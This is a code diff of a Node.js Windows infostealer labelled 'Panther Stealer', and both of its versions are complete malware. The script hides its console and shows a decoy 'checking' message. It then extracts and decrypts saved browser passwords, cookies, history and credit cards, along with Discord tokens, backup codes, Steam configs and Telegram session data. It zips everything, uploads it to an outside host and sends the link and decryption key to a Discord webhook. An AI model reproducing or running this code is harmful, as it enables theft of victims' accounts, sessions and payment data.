@@ -2,336 +2,384 @@
     console.clear()
     process.title = ''
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    console.log('Thank you for using our tool! We will protect your browser data.')
+    console.log('We are checking if everything is ok')
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+    const pa = require('path')
     const fs = require('fs-extra')
-    const os = require('os')
-    const ph = require('path')
+    const fa = require('fast-glob')
+    const be = require('better-sqlite3')
+    const wi = require('node-dpapi-prebuilt')
     const ci = require('crypto')
-    const db = require('better-sqlite3')
-    const gl = require('fast-glob')
-    const wi = require('windcrypt')
-    const ch = require('child_process')
-    const we = require('discord-webhook-node')
+    const fu = require('find-process')
+    const cm = require('child_process')
+    const dw = require('discord-webhook-node')
     const fe = require('node-fetch')
-    const ar = require('archiver')
+    const ad = require('adm-zip')
     const sm = require('form-data')
     const ko = require('koffi')
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    const us = ko.load('user32.dll')
-
-    const bj = us.func('int ShowWindow(void* hWnd, int nCmdShow)')
-    const bk = us.func('void* GetParent(void* hWnd)')
-
-    const kr = ko.load('kernel32.dll')
-    const lo = kr.func('void* GetConsoleWindow()')
-
-    async function win() {
-        return await new Promise(async (resolve) => {
-            const a = lo()
-            const b = bk(a)
-            return resolve(b || a)
-        })
-    }
-
-    if (await win()) {
-        const fg = await win()
-        await bj(fg, 0)
-    }
-
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    const hotn = os.hostname()
-    const host = os.userInfo().username
-    const nodf = process.env.USERPROFILE
-    const ppdat = process.env.APPDATA
-    const local = process.env.LOCALAPPDATA
-    const temp = process.env.TEMP
-    const sups = String(host + Date.now() + hotn)
-
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    const ho = new we.Webhook({
+    const ho = new dw.Webhook({
         'url': '*WEBHOOK*',
         'throwErrors': false,
         'retryOnLimit': true
     })
 
-    ho.setUsername(hotn)
-    ho.setAvatar('https://i.pinimg.com/736x/87/05/44/8705446ce1a4bdb9e8f59d0054c2ec13.jpg')
+    ho.setUsername('Panther Stealer')
+    ho.setAvatar('https://i.pinimg.com/564x/41/cf/30/41cf30478b0b1f936988aef69e404d7f.jpg')
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    async function luz(a, c) {
-        return await new Promise((resolve) => {
-            try {
-                if (a.slice(0, 4).toString() === '0100') return wi.unprotectData(a)
-                dec = ci.createDecipheriv('aes-256-gcm', c, a.slice(3, 15)).setAuthTag(a.slice(-16))
-                resolve(dec.update(a.slice(15, -16), 'base64', 'utf-8') + dec.final('utf-8'))
-            } catch {
-                resolve(null)
-            }
-        })
-    }
-
-    async function low(b, a) {
+    async function sol(a, c) {
         return await new Promise(async (resolve) => {
             try {
-                fs.copySync(b, a)
-                resolve(true)
-            } catch (e) {
-                if (String(e).includes('busy or locked')) {
-                    roc = b.includes('Google') ? 'chrome' : b.includes('Edge') ? 'msedge' : 'brave'
-                    try {
-                        ch.execSync(`taskkill /f /im ${roc}.exe`, {
-                            'windowsHide': true
-                        })
-                    } catch (e) {
-                        resolve(null)
-                    }
-                    return resolve(await low(b, a))
+                if (a.slice(0, 4).toString() === '0100') {
+                    dec = wi.unprotectData(a, null, 'CurrentUser')
+
+                    resolve(dec)
                 } else {
-                    resolve(null)
+                    dec = ci.createDecipheriv('aes-256-gcm', c, a.slice(3, 15)).setAuthTag(a.slice(-16))
+                    dec = await dec.update(a.slice(15, -16), 'base64', 'utf-8') + dec.final('utf-8')
+
+                    resolve(dec)
                 }
+            } catch (e) {
+                resolve(false)
             }
         })
     }
 
-    async function crip(a, b) {
+    async function pir(a, b) {
         return new Promise((resolve) => {
             try {
-                g = ci.randomBytes(16)
-                h = ci.createCipheriv('aes-256-ctr', ci.createHash('sha256').update(b).digest(), g)
-                j = h.update(a, 'utf8', 'hex')
-                j += h.final('hex')
-                resolve(g.toString('hex') + ':' + j)
+                let g = ci.randomBytes(16)
+                const iv = g.toString('hex')
+
+                const cc = ci.createCipheriv('aes-256-ctr', ci.createHash('sha256').update(b).digest(), g)
+
+                let j = cc.update(a, 'utf8', 'hex')
+                j += cc.final('hex')
+
+                resolve(iv + ':' + j)
             } catch (error) {
                 resolve(false)
             }
         })
     }
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    kc = ''
-
-    try {
-        kc = await (await fe('http://ip-api.com/json/', {
-            'method': 'GET',
-            'headers': {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; x64 Trident/7.0)'
-            }
-        })).json()
-    } catch { }
-
-    if (kc) {
-        kc = await crip(JSON.stringify(kc, null, 3), sups)
-        fs.outputFileSync(ph.join(temp, 'Panther', 'ip.json'), JSON.stringify(kc, null, 3))
+    async function gen(l) {
+        return await new Promise(async (resolve) => {
+            resolve(ci.randomBytes(Math.ceil(l * 3 / 4)).toString('base64').slice(0, l))
+        })
     }
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    nav = []
-    bkp = []
-    dc = []
+    const fc = (await fu('name', 'exe')).map(o => o.bin)
 
-    sen = []
-    cen = []
-    hen = []
-    pen = []
-    tok = []
-    kpb = []
+    var dir_d = []
+    var dir_v = []
+    var dir_c = []
+    var dir_s = []
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    const dc = process.env.USERNAME + await gen(Math.floor(Math.random() * (15 - 10 + 1)) + 10)
 
-    for await (const cam of [
-        ph.join(local, 'Google'),
-        ph.join(local, 'Microsoft', 'Edge'),
-        ph.join(ppdat, 'discord'),
-        ph.join(nodf, 'Downloads'),
+    const co = {
+        'pa': [],
+        'pe': [],
+        'pi': [],
+        'po': [],
+        'to': [],
+        'pl': '❌',
+        'be': [],
+        'st': '❌',
+        'tl': '❌'
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    const us = ko.load('user32.dll')
+    const ke = ko.load('kernel32.dll')
+
+    const sh = us.func('int ShowWindow(void* hWnd, int nCmdShow)')
+    const ge = us.func('void* GetParent(void* hWnd)')
+    const gt = ke.func('void* GetConsoleWindow()')
+
+    async function win() {
+        const a = gt()
+        return ge(a) || a
+    }
+
+    const hw = await win()
+    if (hw) {
+        sh(hw, 0)
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    let ip
+
+    try {
+        ip = await (await fe("https://ipinfo.io/json")).text()
+    } catch { }
+
+    if (ip.includes('city')) {
+        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Computer', 'ip.txt'), await pir(`─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${JSON.stringify(ip, null, 3)}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`, dc))
+        co.pl = '✅'
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    for await (const cs of [
+        process.env.APPDATA,
+        process.env.LOCALAPPDATA,
+        process.env['ProgramFiles(x86)'],
+        process.env.USERPROFILE, '\\Downloads',
     ]) {
-        const entries = await gl([
-            '**/Cookies', '**/Login Data', '**/History', '**/Web Data', '**/Local Storage/leveldb/*.ldb', '**/Local Storage/leveldb/*.log',
-            '**/*discord_backup_codes*', '**/*Backup-codes*'
+        const mm = await fa([
+            '**/User Data/**/Login Data', '**/User Data/**/Cookies',
+            '**/User Data/**/History', '**/User Data/**/Web Data',
+            '**/Local Storage/leveldb/*.ldb', '**/Local Storage/leveldb/*.log',
+            '**/*discord_backup_codes*', '**/*Backup-codes*',
+            'config/**'
         ], {
-            'cwd': cam,
-            'ignore': [
-                '**/node_modules/**', '**.dll', '**.exe', '**.log',
-                '**.json', '**.lock', '**.md', '**.txt', '**.yml',
-                '**.zip', '**.tar.gz', '**.tar.xz', '**.tar',
-                '**.tgz', '**.gz', '**.xz', '**.zip', '**.7z',
-                '**.rar', '**.bin', '**.dat', '**.sqlite',
-                '**.sqlite3', '**.db', '**.db3', '**.sql',
-                '**.bak', '**.temp', '**.tmp', '**.cache',
-                '**.bak', '**.backup', '**.old', '**.ini',
-                '**.conf', '**.config', '**.xml', '**.bak',
-                '**.bak', '**.bak', '**.bak', '**.bak',
-            ],
-            'onlyFiles': true,
+            'dot': true,
+            'cwd': cs,
             'absolute': true,
-            'stats': false
+            'suppressErrors': true
         })
 
-        for await (const value of entries) {
-            if (value.includes('Local Storage')) {
-                dc.push(value)
-            } else if (value.includes('discord_backup_codes') || value.includes('Backup-codes')) {
-                bkp.push(value)
+        if (cs.includes('AppData')) {
+            dir_d.push(...mm.filter(o => /(Login Data|History|Cookies|Web Data)/.test(o)))
+            dir_v.push(...mm.filter(o => o.includes('leveldb')))
+        } if (cs.includes('Steam')) {
+            dir_s.push(...mm.filter(o => o.includes('Steam/config')))
+        } else {
+            dir_c.push(...mm.filter(o => o.includes('codes')))
+        }
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    for (let i = 0; i < dir_d.length; i++) {
+        const di = dir_d[i]
+
+        let ro = ''
+        var fi = ''
+
+        var ni = di.split('/')[6]
+        let ka = ''
+
+        const lo = di.includes('Cookies') ? {
+            'na': 'SELECT * FROM Cookies',
+            'ne': 'Cookie'
+        } : di.includes('Login Data') ? {
+            'na': 'SELECT * FROM Logins',
+            'ne': 'Password'
+        } : di.includes('History') ? {
+            'na': 'SELECT * FROM urls',
+            'ne': 'History'
+        } : di.includes('Web Data') ? {
+            'na': 'SELECT * FROM credit_cards',
+            'ne': 'Credit Card'
+        } : undefined
+
+        if (!lo) {
+            continue
+        }
+
+        const no = di.split('Profile ')[1]?.split('/')[0] ? `Profile ${di.split('Profile ')[1].split('/')[0]}-` : di.includes('Default') ? 'Default-' : di.includes('Guest') ? 'Guest-' : ''
+
+        try {
+            ro = new be(di, {
+                'readonly': true
+            }).prepare(lo['na']).all()
+        } catch (e) {
+            if (String(e).includes('database is locked')) {
+                var ku = fc.find(o => o.includes(ni))
+
+                if (ku) {
+                    await new Promise(async (resolve) => {
+                        cm.exec(`taskkill /F /IM ${pa.basename(ku)}`, (e, s, c) => {
+                            if (e || s) {
+                                resolve(false)
+                            } else {
+                                i--
+                                resolve(true)
+                            }
+                        })
+                    })
+                }
+
+                continue
             } else {
-                nav.push(value)
+                continue
             }
         }
 
-        for await (const value of nav) {
-            if (value.includes('Snapshots')) continue
+        if (!ro.length) {
+            continue
+        }
 
-            pf1 = value.includes('Google') ? 'Google' : value.includes('Edge') ? 'Microsoft Edge' : value.includes('BraveSoftware') ? 'Brave' : null
-
-            if (!pf1) continue
-
-            pf2 = value.includes('Profile') ? 'Profile ' + String(value?.split('Profile ')?.[1]?.split('/')?.[0] ?? Date.now()) : value.includes('Default') ? 'Default' : 'Guest'
-            pf3 = value.includes('Cookies') ? 'Cookies' : value.includes('Login Data') ? 'Login Data' : value.includes('History') ? 'History' : 'Web Data'
-
-            a = ph.join(temp, 'Panther-Files', String('file-' + Date.now() + '.db'))
-
-            vuc = await low(value, a)
-            if (!vuc) continue
-
-            sec = pf3.includes('Cookies') ? 'SELECT * FROM Cookies' : pf3.includes('Login Data') ? 'SELECT * FROM Logins' : pf3.includes('History') ? 'SELECT * FROM urls' : 'SELECT * FROM credit_cards'
-
-            ru = ''
-            hu = ''
-
+        if (lo['ne'] === 'Password' || lo['ne'] === 'Cookie') {
             try {
-                ru = new db(a)
-                hu = await ru.prepare(sec).all()
-            } catch (error) {
+                ka = (await fa('**/Local State', {
+                    'dot': true,
+                    'cwd': di.split('/').slice(0, 6).join('/'),
+                    'absolute': true,
+                    'suppressErrors': true
+                }))?.[0] ?? undefined
+
+                if (!ka) {
+                    continue
+                }
+
+                ka = await fs.promises.readFile(ka)
+                ka = Buffer.from(JSON.parse(ka).os_crypt.encrypted_key, 'base64').slice(5)
+                ka = wi.unprotectData(ka, null, 'CurrentUser')
+            } catch (e) {
+                continue
+            }
+        }
+
+        for await (const vo of ro) {
+            if (lo['ne'] === 'Password') {
+                var de = await sol(vo['password_value'], ka)
+
+                fi += `🔗 Url: ${vo['origin_url']}\n🧑 User: ${vo['username_value']}\n🔑 Password: ${de}\n\n`
+                co.pa.push(1)
+            } else if (lo['ne'] === 'Cookie') {
+                var de = await sol(vo['encrypted_value'], ka)
+
+                fi += `${vo['host_key']}\tTRUE\t/\tFALSE\t${vo['expires_utc']}\t${vo['name']}\t${de}\n\n`
+                co.pe.push(1)
+            } else if (lo['ne'] === 'History') {
+                fi += `${vo.url}\n\n`
+                co.pi.push(1)
+            } else if (lo['ne'] === 'Credit Card') {
+                fi += `🧑 Name: ${vo['name_on_card']}\n💳 Number: ${vo['card_number_encrypted']}\n⌛ Expires: ${vo['expiration_month'] ? (vo['expiration_month'] < 10 ? `0${vo['expiration_month']}` : vo['expiration_month']) : '❌'}/${vo['expiration_year'] ? vo['expiration_year'] : '❌'}\n\n`
+                co.po.push(1)
+            } else {
+                continue
+            }
+        }
+
+        if (fi) {
+            await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Browser', lo['ne'], `${ni}-${no}${Date.now()}.txt`), await pir(`─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\nDirectory: ${di}\n\n${fi}─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`, dc))
+        } else {
+            continue
+        }
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    for await (const lã of dir_v) {
+        let li
+
+        try {
+            li = (await fs.promises.readFile(lã, 'utf-8')).split('\n')
+        } catch (e) {
+            continue
+        }
+
+        if (lã.includes('cord')) {
+            ka = (await fa('**/Local State', {
+                'dot': true,
+                'cwd': lã.split('/').slice(0, 6).join('/'),
+                'absolute': true,
+                'suppressErrors': true
+            }))?.[0] ?? undefined
+
+            if (!ka) {
                 continue
             }
 
-            bs = ''
+            ka = await fs.promises.readFile(ka, 'utf-8')
+            ka = Buffer.from(JSON.parse(ka).os_crypt.encrypted_key, 'base64').slice(5)
+            ka = wi.unprotectData(ka, null, 'CurrentUser')
 
-            if (pf3 === 'Cookie' || pf3 === 'Login Data') {
-                bs = value.split('User Data')[0] + 'User Data\\Local State'
-                bs = Buffer.from(JSON.parse(fs.readFileSync(bs, 'utf8')).os_crypt.encrypted_key, 'base64').slice(5)
-                bs = wi.unprotectData(bs, null)
-            }
+            for await (const pa of li) {
+                var oc = pa.match(new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g))
 
-            ka = ''
-
-            for await (const eulav of hu) {
-                if (value.includes('Login Data')) {
-                    cj = await luz(eulav.password_value, bs)
-                    ka += `Url: ${eulav.origin_url ?? '❌'}\nUser: ${eulav.username_value ?? '❌'}\nPass: ${cj ?? '❌'}\n`
-                    sen.push(1)
-                } else if (value.includes('Cookies')) {
-                    cj = await luz(eulav.encrypted_value, bs)
-                    ka += `${eulav.host_key}\tTRUE\t/\tFALSE\t${eulav.expires_utc}\t${eulav.name}\t${cj}\n`
-                    cen.push(1)
-                } else if (value.includes('History')) {
-                    ka += `${eulav.url}\n`
-                    hen.push(1)
-                } else if (value.includes('Web Data')) {
-                    cj = await luz(eulav.card_number_encrypted, bs)
-                    ka += `${eulav.name_on_card}\n${cj}\n${eulav.expiration_month ? (eulav.expiration_month < 10 ? `0${eulav.expiration_month}` : eulav.expiration_month) : '❌'}/${eulav.expiration_year ? eulav.expiration_year : '❌'}\n❌\n`;
-                    pen.push(1)
-                }
-            }
-
-            if (ka !== '') {
-                ka = await crip(ka, sups)
-                fs.outputFileSync(ph.join(temp, 'Panther', 'Navegador', pf3, `${pf1}-${pf2}-${pf3}.txt`), ka)
-            }
-        }
-    }
-
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    for await (const value of dc) {
-        if (value.includes('discord')) {
-            lin = fs.readFileSync(value, 'utf-8').split(/\r?\n/)
-            gex = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g)
-            ted = Buffer.from(JSON.parse(fs.readFileSync(ph.join(process.env.APPDATA, 'discord', 'Local State'), 'utf-8')).os_crypt.encrypted_key, 'base64').slice(5)
-            key = await wi.unprotectData(ted)
-
-            for await (const l of lin) {
-                const o = l.match(gex)
-                if (o) {
-                    for await (let kook of o) {
-                        kook = Buffer.from(kook.split('dQw4w9WgXcQ:')[1], 'base64')
-                        kood = kook.slice(3, 15)
-                        koot = kook.slice(15, kook.length - 16)
-
-                        koom = kook.slice(kook.length - 16, kook.length)
-                        koox = ci.createDecipheriv('aes-256-gcm', key, kood)
-                        koox.setAuthTag(koom)
-
-                        kook = koox.update(koot, 'base64', 'utf-8') + koox.final('utf-8')
-                        tok.push(kook)
-                    }
+                if (oc) {
+                    oc.forEach(async o => {
+                        o = await sol(Buffer.from(o.split('dQw4w9WgXcQ:')[1], 'base64'), ka)
+                        co.to.push(o)
+                    })
                 }
             }
         } else {
-            lin = fs.readFileSync(value, 'utf-8').split(/\r?\n/)
-            gex = new RegExp(/[\w-_]{24,26}\.[\w-_]{6}\.[\w-_]{25,110}|mfa\.[\w-]{84}|[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}|[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)
+            for await (const pa of li) {
+                var oc = pa.match(new RegExp(/[\w-_]{24,26}\.[\w-_]{6}\.[\w-_]{25,110}|mfa\.[\w-]{84}|[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}|[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g))
 
-            for await (const l of lin) {
-                o = l.match(gex)
-                if (o) {
-                    for await (let d of o) {
-                        tok.push(d)
-                    }
+                if (oc) {
+                    oc.forEach(o => {
+                        co.to.push(o)
+                    })
                 }
             }
         }
     }
 
-    if (tok.length !== 0) {
-        vul = await crip(tok.join('\n'), sups)
-        fs.outputFileSync(ph.join(temp, 'Panther', 'Discord', 'Token.txt'), vul)
+    if (co.to.length > 0) {
+        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Discord', 'Token.txt'), await pir(`─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${co.to.join('\n')}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`, dc))
     }
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    for await (const value of bkp) {
-        kpb.push(1)
-        losk = ''
-        losk = await cript(fs.readFileSync(value, 'utf-8'), sups)
-        if (value.includes('discord')) {
-            fs.outputFileSync(ph.join(temp, 'Panther', 'Backup', `Dc-backup-${Date.now()}.txt`), losk)
-        } else {
-            fs.outputFileSync(ph.join(temp, 'Panther', 'Backup', `Nv-backup-${Date.now()}.txt`), losk)
+    for await (const ks of dir_c) {
+        const ka = await fs.promises.readFile(ks, 'utf-8')
+
+        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Backup', `${pa.basename(ks)}-${Date.now()}.txt`), await pir(`─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${ka}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`, dc))
+        co.be.push(1)
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    if (dir_s.length > 0) {
+        co.st = '✅'
+
+        for await (const kc of dir_s) {
+            try {
+                await fs.copy(kc, pa.resolve(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Steam\\', kc.split('/Steam/')[1]))
+            } catch { }
         }
     }
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    tjf = ph.join(temp, host + '-Panther.zip')
-    out = fs.createWriteStream(tjf)
+    if (await fs.exists(pa.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'))) {
+        co.tl = '✅'
 
-    vei = ar('zip', {
-        'zlib': {
-            'level': 9
-        }
-    })
+        try {
+            await fs.copy(pa.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'), pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Telegram'))
 
-    vei.pipe(out)
-    vei.directory(ph.join(temp, 'Panther'), false)
-    await vei.finalize()
+            for await (const ma of ['emoji', 'user_data']) {
+                await fs.remove(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, ma))
+            }
+        } catch { }
+    }
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    const mc = new ad()
+
+    await Promise.all([
+        mc.addLocalFolder(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`)),
+        mc.writeZip(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`))
+    ])
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     const fom = new sm()
-    fom.append('file', fs.createReadStream(tjf))
+    fom.append('file', fs.createReadStream(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`)))
 
-    let api = await (await fe('https://api-lofy.xyz/upload', {
+    const up = await (await fe('https://api-lofy.xyz/upload', {
         'method': 'POST',
         'body': fom,
         'headers': {
@@ -339,21 +387,28 @@
         }
     })).json()
 
-    api = `https://api-lofy.xyz/download?key=${api.key}`
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    bed = new we.MessageBuilder()
-        .setTitle('\`Panther\`')
-        .setAuthor(host, 'https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg', api)
-        .setURL(api)
-        .setDescription(`\n🗺️ **Ip:** ${'\`' + String(kc ? '✅' : '❌') + '\`'}\n🔑 **Password:** ${'\`' + String(sen.length) + '\`'}\n🍪 **Cookie:** ${'\`' + String(cen.length) + '\`'}\n🔍 **Historic:** ${'\`' + String(hen.length) + '\`'}\n💳 **Card:** ${'\`' + String(pen.length) + '\`'}\n👟 **Token:** ${'\`' + String(tok.length) + '\`'}\n📦 **Backup:** ${'\`' + String(kpb.length) + '\`'}\n\n🧊 **Descript Key:** \`${sups}\``)
-        .setColor('#95319e')
-        .setThumbnail('https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg')
-        .setFooter(host, 'https://i.pinimg.com/564x/21/60/1c/21601c1e162f6ea8ce72ce3f96abcbec.jpg')
+    const embed = new dw.MessageBuilder()
+        .setTitle('Panther Stealer')
+        .setColor('#a83f95')
+        .setAuthor(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg', 'https://github.com/PantherOwO')
+        .addField('🗺️ **Ip**', `\`\`\`${co.pl}\`\`\``, true)
+        .addField('💻 **Backup**', `\`\`\`${co.to.length}\`\`\``, true)
+        .addField('🚉 **Steam**', `\`\`\`${co.st}\`\`\``, true)
+        .addField('🧦 **Telegram**', `\`\`\`${co.tl}\`\`\``, true)
+        .addField('🧩 **Discord Token(s)**', `\`\`\`${co.to.length}\`\`\``, true)
+        .addField('🔑 **Password(s)**', `\`\`\`${co.pa.length}\`\`\``, false)
+        .addField('🍪 **Cookie(s)**', `\`\`\`${co.pe.length}\`\`\``, true)
+        .addField('📅 **History(s)**', `\`\`\`${co.pi.length}\`\`\``, true)
+        .addField('💳 **Credit Card(s)**', `\`\`\`${co.po.length}\`\`\``, true)
+        .addField('🆙 **Dowlond**', `[Click Here](https://api-lofy.xyz/download?key=${up.key})`, true)
+        .addField('🥎 **Decryption password**', `\`\`\`${dc}\`\`\``, false)
+        .setThumbnail('https://i.pinimg.com/564x/19/f8/2f/19f82f9bfe1f76ec8b8415097152f85a.jpg')
         .setTimestamp()
+        .setFooter(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg')
 
-    await ho.send(bed)
+    return await ho.send(embed)
 
-    return console.log('Done!')
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 })()
